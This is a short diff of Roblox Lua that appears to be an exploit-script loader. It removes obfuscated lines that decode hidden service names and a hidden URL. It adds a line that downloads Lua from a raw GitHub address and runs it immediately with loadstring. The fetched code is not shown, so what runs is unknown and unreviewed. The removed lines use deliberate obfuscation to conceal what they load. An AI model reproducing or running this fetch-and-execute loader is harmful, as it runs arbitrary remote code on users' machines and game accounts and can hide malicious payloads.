@@ -1,5 +1,1 @@
-repeat wait() until game:IsLoaded()
-
-_G._0x0 = game:GetService(_G.__0xbd(11))
-_G._0x1 = _G._0x0.LocalPlayer
-_G._0x2 = loadstring(game:HttpGet(_G.__0xbd(8)))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AAAA123218a/D/refs/heads/main/Script%20Lua"))()
